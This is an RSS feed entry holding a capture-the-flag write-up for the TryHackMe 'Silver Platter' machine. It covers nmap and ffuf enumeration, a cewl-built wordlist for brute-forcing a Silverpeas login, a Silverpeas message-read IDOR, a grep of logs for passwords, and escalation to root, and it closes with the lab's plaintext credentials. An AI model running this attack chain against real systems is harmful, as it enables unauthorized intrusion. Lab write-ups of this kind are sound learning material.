@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Silver Platter]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Silver Platter</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Tue, 14 Jan 2025 01:00:05 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Tue, 14 Jan 2025 01:00:04 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Challenge Description]]></title><description><![CDATA[ 
+ <br>by <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/TeneBrae93" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/TeneBrae93" target="_blank">TeneBrae93</a><br><img alt="Pasted image 20250112205459.png" src="pasted-image-20250112205459.png"><br><br>Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!  <br>But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top.&nbsp;<br>May your code be swift, your exploits flawless, and victory&nbsp;yours!<br>Make sure you wait a full 5 minutes after you start the machine before scanning or doing any enumeration. This will make sure all the services have started.<br><br>IP Address: 10.10.206.48<br><br>First off, let's perform a NMAP scan against the server to see all the open ports<br>sudo nmap -sC -sV -T5 -vv 10.10.206.48 -oA Nmap/Silver_Platter.nmap
+<br>OutPut:<br>PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ0ia1tcuNvK0lfuy3Ep2dsElFfxouO3VghX5Rltu77M33pFvTeCn9t5A8NReq3felAqPi+p+/0eRRfYuaeHRT4=
+|   256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKecigNtiy6tW5ojXM3xQkbtTOwK+vqvMoJZnIxVowju
+80/tcp   open  http       syn-ack ttl 60 nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Hack Smarter Security
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http-proxy syn-ack ttl 59
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Sun, 12 Jan 2025 15:26:47 GMT
+|     &lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404 - Not Found&lt;/body&gt;&lt;/html&gt;
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Sun, 12 Jan 2025 15:26:46 GMT
+|_    &lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404 - Not Found&lt;/body&gt;&lt;/html&gt;
+|_http-title: Error
+<br>The Open ports are:<br>
+<br>Port 22 - SSH
+<br>Port 80 - Web Server
+<br>Port 8080 - Probably a Web Server
+<br>So, to access the Web Application, let's add the domain name to our /etc/hosts file<br>10.10.206.48 silver_platter.thm
+<br><br>First, let's try accessing the server's application at port 80.<br>Here under the #contact page, we see a username being displayed to us.<br><img alt="Pasted image 20250113195426.png" src="pasted-image-20250113195426.png"><br>Other than that, there is no information that is useful to us.<br><br>By fuzzing the Application for files, folders and vhosts, we got not useful and satisfying results from them.<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing-List/SecLists/Discovery/Web-Content/raft-medium-files.txt -u "http://silver_platter.thm/FUZZ"
+<br><img alt="Pasted image 20250113195904.png" src="pasted-image-20250113195904.png"><br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing-List/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u "http://silver_platter.thm/FUZZ"
+<br><img alt="Pasted image 20250113200600.png" src="pasted-image-20250113200600.png"><br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing-List/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://silver_platter.thm/" -H "HOST:FUZZ.silver_platter.thm" -fw 926
+<br><img alt="Pasted image 20250113200807.png" src="pasted-image-20250113200807.png"><br><br>Now, since there is no useful output from the Port 80 web application, let's try to access the application at Port 8080.<br><img alt="Pasted image 20250113195752.png" src="pasted-image-20250113195752.png"><br>Here, we see an error saying 404 - Not Found, which means that the index pages or any of the related pages are not found, now, for this, let's fuzz for files.<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing-List/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u "http://silver_platter.thm:8080/FUZZ"
+<br><img alt="Pasted image 20250113201431.png" src="pasted-image-20250113201431.png"><br>Here we get some directories present in the server, but not much of an use to us.<br><img alt="Pasted image 20250113201546.png" src="pasted-image-20250113201546.png"><br>after some time, looking back the PORT 80 application, I notice the reference of Silverpeas, which happened to be an application for contacting people.<br><img alt="Pasted image 20250113201839.png" src="pasted-image-20250113201839.png"><br>I tried accessing the silverpease application in the port 80 application, but then failed, but, we could get a login page in the port 8080 page.<br>http://silver_platter.thm:8080/silverpeas
+<br><img alt="Pasted image 20250113203558.png" src="pasted-image-20250113203558.png"><br>Here, we are greeted with the login Page of silverpease, we might have found the username as scr1ptkiddy, but we are supposed to find the password to this username.<br>And according to the challenge description, they have disallowed any passwords that have been breached, which means that we can't find any passwords from the rockyou.txt file.<br><img alt="Pasted image 20250113204207.png" src="pasted-image-20250113204207.png"><br>So, to get some passwords, let' use cewl tool to generate some password using the contents of the Port 80 web application.<br>cewl http://silver_platter.thm/ &gt; Passwords.txt
+<br><img alt="Pasted image 20250113204533.png" src="pasted-image-20250113204533.png"><br>Now, using this wordlist, let's try to crack the password of the web application using ffuf<br>ffuf -w ./Passwords.txt -u "http://silver_platter.thm:8080/silverpeas/AuthenticationServlet" -X POST -d "Login=scr1ptkiddy&amp;Password=FUZZ&amp;DomainId=0" -H "Content-Type: application/x-www-form-urlencoded" -r -mc all -fs 8282
+<br>And Here we get the password:<br><img alt="Pasted image 20250113211320.png" src="pasted-image-20250113211320.png"><br>With this password, let's try to log into the application.<br><img alt="Pasted image 20250113211422.png" src="pasted-image-20250113211422.png"><br>Once loggedin to the application, we see no useful information to go forward, so, let's look for a public exploit for this application's service.<br>
+Reading through this blog post: <a data-tooltip-position="top" aria-label="https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/" rel="noopener nofollow" class="external-link" href="https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/" target="_blank">Silverpeas App: Multiple CVEs leading to File Read on Server</a> we find a suitable exploit to perform, to read all the messages of the user.<br><img alt="Pasted image 20250113212325.png" src="pasted-image-20250113212325.png"><br>So, let's access the page. http://silver_platter.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=1<br><img alt="Pasted image 20250113212413.png" src="pasted-image-20250113212413.png"><br>And Here we go!!!! With just a few ID's we get the required message!!!!!!! <br><img alt="Pasted image 20250113212630.png" src="pasted-image-20250113212630.png"><br>Using this username and password, let's login into the ssh service.<br><br>AND WE LOGIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br><img alt="Pasted image 20250113212832.png" src="pasted-image-20250113212832.png"><br>Here can find the flag.<br><img alt="Pasted image 20250113212943.png" src="pasted-image-20250113212943.png"><br>Now, after a bit of deep recon on the file system and finding nothing out of order for to look at, we know that we have a user called tyler<br><img alt="Pasted image 20250113213801.png" src="pasted-image-20250113213801.png"><br>And by running the id command, we see that our present user is a part of the adm group, let's see the files which are a part of this group.<br>find / -group adm 2&gt;/dev/null
+<br><img alt="Pasted image 20250113214002.png" src="pasted-image-20250113214002.png"><br>Here we see that we have access to most of the log log files<br>while looking at all the log files, we see an interesting file part of the log, where we see a password of the root user to a docker run by tyler<br>grep -Ri "password" /var/log/ 2&gt;/dev/null
+<br><img alt="Pasted image 20250113215133.png" src="pasted-image-20250113215133.png"><br>Now, let's try this password to the tyler user.<br>su - tyler
+<br><img alt="Pasted image 20250113220025.png" src="pasted-image-20250113220025.png"><br>Now, since the tyler user is a part of the sudo group, we can now shift to the root user.<br>sudo su -
+<br><img alt="Pasted image 20250113220147.png" src="pasted-image-20250113220147.png"><br><br>Username: scr1ptkiddy<br>
+Password: adipiscing<br><br>Username: tim<br>
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol<br><br>Username: tyler<br>
+Password: _Zd_zx7N823]]></description><link>silver-platter.html</link><guid isPermaLink="false">Silver Platter.md</guid><pubDate>Mon, 13 Jan 2025 16:31:48 GMT</pubDate><enclosure url="pasted-image-20250112205459.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20250112205459.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
